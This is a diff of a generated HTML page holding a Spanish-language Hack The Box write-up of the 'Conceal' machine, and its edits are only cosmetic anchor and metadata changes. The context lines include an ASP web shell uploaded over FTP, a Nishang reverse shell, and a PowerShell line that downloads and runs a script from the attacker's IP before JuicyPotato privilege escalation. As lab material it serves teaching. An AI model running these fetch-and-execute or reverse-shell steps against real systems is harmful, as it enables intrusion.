@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Conceal expone el puerto SNMP donde obtuvimos informacion para generar la configuracion para una VPN y posteriormente conectarnos a esta. Obtuvimos acceso a la maquina con una web shell en FTP que luego actualizamos a una shell de PowerShell. SetImpersonatePrivilege es el privilegio que explotamos con Juicy Potato para escalar privilegios.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1591,13 +1591,13 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/snmp/" class="single__tag" title="snmp">snmp</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/nishang/" class="single__tag" title="nishang">nishang</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/juicy-potato/" class="single__tag" title="juicy potato">juicy potato</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/snmp/" class="single__tag" title="snmp">snmp</a></li>
   
 
 </ul>
@@ -1680,7 +1680,7 @@
 </tr>
 </tbody>
 </table>
-<h1 id="masscan-">MASSCAN</h1>
+<h1 id="masscan">MASSCAN</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1730,7 +1730,7 @@ Discovered open port 161/udp on 10.10.10.116&lt;/pre&gt;
 </span><span class="err"></span><span class="nx">System</span> <span class="nx">date</span>                   : <span class="m">2019-3-2</span> <span class="m">04</span>:<span class="m">26</span>:<span class="m">04</span>.<span class="m">7</span><span class="err">
 </span></code></pre></td></tr></table>
 </div>
-</div><h1 id="ike-vpn-password-psk-">IKE VPN password PSK</h1>
+</div><h1 id="ike-vpn-password-psk">IKE VPN password PSK</h1>
 <p>Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1791,7 +1791,7 @@ Discovered open port 161/udp on 10.10.10.116&lt;/pre&gt;
 </span><span class="err"></span><span class="m">10</span>.<span class="m">10</span>.<span class="m">10</span>.<span class="m">116</span> : <span class="nx">PSK</span> <span class="s2">&#34;Dudecake1!&#34;</span><span class="err">
 </span></code></pre></td></tr></table>
 </div>
-</div><h2 id="status-ipsec-">STATUS IPSEC</h2>
+</div><h2 id="status-ipsec">STATUS IPSEC</h2>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.40.51.webp" alt="image" /></p>
 <h2 id="nmap---ipsec">NMAP - IPSEC</h2>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.40.22.webp" alt="image" /></p>
@@ -1802,10 +1802,10 @@ Discovered open port 161/udp on 10.10.10.116&lt;/pre&gt;
 <h2 id="ftp---ipsec">FTP - IPSEC</h2>
 <p>Nos conectamos como usuario anonymous pero no encontramos nada dentro.<br />
 <img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.50.35.webp" alt="image" /></p>
-<h2 id="http---ipsec-">HTTP - IPSEC</h2>
+<h2 id="http---ipsec">HTTP - IPSEC</h2>
 <p>Enumerando con gobuster encontramos solo una direccion.<br />
 <img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.47.40.webp" alt="image" /></p>
-<h3 id="upload-">/upload</h3>
+<h3 id="upload">/upload</h3>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.55.02.webp" alt="image" /></p>
 <h1 id="webshell">WEBSHELL</h1>
 <p>Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.</p>
@@ -1900,7 +1900,7 @@ Response.Write(thisDir)%&gt;
 </div><p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-08%2019.07.12.webp" alt="image" /></p>
 <p>Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.</p>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-08%2019.08.12.webp" alt="image" /></p>
-<h2 id="reverse-shell---nishang-">REVERSE SHELL - Nishang</h2>
+<h2 id="reverse-shell---nishang">REVERSE SHELL - Nishang</h2>
 <p>Utilizamos una de las shells que tiene <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Nishang</a>, y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.</p>
 <p>En nuestro archivo <code>Invoke-PowerShellTcp.ps1</code> agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.</p>
 <div class="highlight"><div class="chroma">
@@ -1932,9 +1932,9 @@ Response.Write(thisDir)%&gt;
 <h1 id="user">USER</h1>
 <p>Obtenemos nuestra bandera <code>user.txt</code>.<br />
 <img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.33.44.webp" alt="image" /></p>
-<h3 id="systeminfo-">Systeminfo</h3>
+<h3 id="systeminfo">Systeminfo</h3>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.59.58.webp" alt="image" /></p>
-<h3 id="sherlok-">Sherlok</h3>
+<h3 id="sherlok">Sherlok</h3>
 <p>Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2094,7 +2094,7 @@ Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.ht
 VulnStatus : Not Vulnerable
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="whoami-priv-">WHOAMI /priv</h3>
+</div><h3 id="whoami-priv">WHOAMI /priv</h3>
 <p>Revisamos si <code>SeImpersonatePrivilege</code> esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar <code>JuicyPotato</code> para obtener <code>NT AUTHORITY\SYSTEM</code>.</p>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.35.13.webp" alt="image" /></p>
 <h1 id="privilege-escalation---juicypotato">PRIVILEGE ESCALATION - JuicyPotato</h1>
@@ -2111,7 +2111,7 @@ VulnStatus : Not Vulnerable
 <pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1&#39;</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="clsid-">CLSID</h3>
+</div><h3 id="clsid">CLSID</h3>
 <p>Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2163,7 +2163,7 @@ FOR /F %%i IN <span class="o">(</span>C:<span class="se">\U</span>sers<span clas
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2000.46.21.webp" alt="image" /></p>
 <p>Ejecutamos <code>test_clsid.bat</code>, el cual nos creara un archivo log (<code>result.log</code>) con las pruebas de <code>CLSID</code> que hay en la lista que creamos anteriormente.</p>
 <p><img src="/images/posts/htb/conceal/Screenshot%20from%202019-04-10%2001.03.30.webp" alt="image" /></p>
-<h3 id="lista-clsid-">Lista CLSID</h3>
+<h3 id="lista-clsid">Lista CLSID</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -2252,7 +2252,7 @@ FOR /F %%i IN <span class="o">(</span>C:<span class="se">\U</span>sers<span clas
 </code></pre></td></tr></table>
 </div>
 </div><p>De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise)">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise)</a>.</p>
-<h2 id="root-">ROOT</h2>
+<h2 id="root">ROOT</h2>
 <video autoplay>
     <source src="/images/posts/htb/conceal/Screen record from 2019-04-10 01.38.15.mov">
 </video>
@@ -3627,20 +3627,20 @@ var a = document.getElementsByClassName('navbar__menu-item')
         <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
           <nav id="TableOfContents">
   <ul>
-    <li><a href="#masscan-">MASSCAN</a></li>
+    <li><a href="#masscan">MASSCAN</a></li>
     <li><a href="#snmp-port">SNMP PORT</a></li>
-    <li><a href="#ike-vpn-password-psk-">IKE VPN password PSK</a></li>
+    <li><a href="#ike-vpn-password-psk">IKE VPN password PSK</a></li>
     <li><a href="#ike-vpn">IKE VPN</a>
       <ul>
         <li><a href="#setup-ipsec---ike-vpn">SETUP IPSEC - IKE VPN</a></li>
-        <li><a href="#status-ipsec-">STATUS IPSEC</a></li>
+        <li><a href="#status-ipsec">STATUS IPSEC</a></li>
         <li><a href="#nmap---ipsec">NMAP - IPSEC</a></li>
         <li><a href="#smb---ipsec">SMB - IPSEC</a></li>
         <li><a href="#rpc---ipsec">RPC - IPSEC</a></li>
         <li><a href="#ftp---ipsec">FTP - IPSEC</a></li>
-        <li><a href="#http---ipsec-">HTTP - IPSEC</a>
+        <li><a href="#http---ipsec">HTTP - IPSEC</a>
           <ul>
-            <li><a href="#upload-">/upload</a></li>
+            <li><a href="#upload">/upload</a></li>
           </ul>
         </li>
       </ul>
@@ -3652,16 +3652,16 @@ var a = document.getElementsByClassName('navbar__menu-item')
             <li><a href="#webshell-1">WEBSHELL</a></li>
           </ul>
         </li>
-        <li><a href="#reverse-shell---nishang-">REVERSE SHELL - Nishang</a></li>
+        <li><a href="#reverse-shell---nishang">REVERSE SHELL - Nishang</a></li>
       </ul>
     </li>
     <li><a href="#user">USER</a>
       <ul>
         <li>
           <ul>
-            <li><a href="#systeminfo-">Systeminfo</a></li>
-            <li><a href="#sherlok-">Sherlok</a></li>
-            <li><a href="#whoami-priv-">WHOAMI /priv</a></li>
+            <li><a href="#systeminfo">Systeminfo</a></li>
+            <li><a href="#sherlok">Sherlok</a></li>
+            <li><a href="#whoami-priv">WHOAMI /priv</a></li>
           </ul>
         </li>
       </ul>
@@ -3670,11 +3670,11 @@ var a = document.getElementsByClassName('navbar__menu-item')
       <ul>
         <li>
           <ul>
-            <li><a href="#clsid-">CLSID</a></li>
-            <li><a href="#lista-clsid-">Lista CLSID</a></li>
+            <li><a href="#clsid">CLSID</a></li>
+            <li><a href="#lista-clsid">Lista CLSID</a></li>
           </ul>
         </li>
-        <li><a href="#root-">ROOT</a></li>
+        <li><a href="#root">ROOT</a></li>
       </ul>
     </li>
   </ul>
